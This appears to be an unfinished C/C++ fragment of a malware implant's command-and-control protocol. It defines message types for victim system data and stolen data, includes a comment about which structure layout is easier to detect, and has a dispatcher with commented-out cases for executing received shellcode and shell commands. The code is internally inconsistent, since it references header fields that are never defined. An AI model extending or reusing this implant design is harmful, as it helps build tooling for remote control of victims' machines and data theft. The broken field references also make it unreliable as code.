
enum MessageType
{
	HANDSHAKE,          // Initial connection
	HEARTBEAT,          // Regular check-in
	SYSTEM_INFO,        // Victim system data
	COMMAND_RESULT,     // Output from executed command
	DATA_EXFIL,         // Stolen data
	FILE_UPLOAD,        // File transfer
	ERROR_REPORT        // Error information

};


struct MessageHeader
{
	MessageType messageType;
	//ULONG messageId; ?
	//ULONG payloadSize; // MessageDataSize
	//ULONG checksum; ?

};


// NOTE: InternalMessage will have to serialize,encrypt,enocde,...etc both the header and payload separately? then combine them together into one array?
// ex: serialize(InternalMessage) wont work, need to do serialize(InternalMessage.header) + serialize(InternalMessage.payload)
// NOTE: this stuct will be easier to detect (struct containing structs), instead of just having the raw fields listed out
struct InternalMessage 
{
	MessageHeader header; // the header... always use custom header? no need for tlv... MessageType enum should be defined in header
	//MessageData payload; // the actual payload
	BYTE payload[4096]; // TODO: shouldn't be fixed size?
}; 


int processMessage(BYTE* payload, MessageHeader* header)
{
	switch (header->message_type) {
		case SYSTEM_INFO:
			return SendSystemInfo(header->message_id);

		/*
		case MSG_TYPE_SHELLCODE:
			return ExecuteShellcode(payload, header->payload_size);

		case MSG_TYPE_CMD:
			return ExecuteCommand((char*)payload, header->payload_size);
		*/

		// ... other cases
	}
	return 0;
}
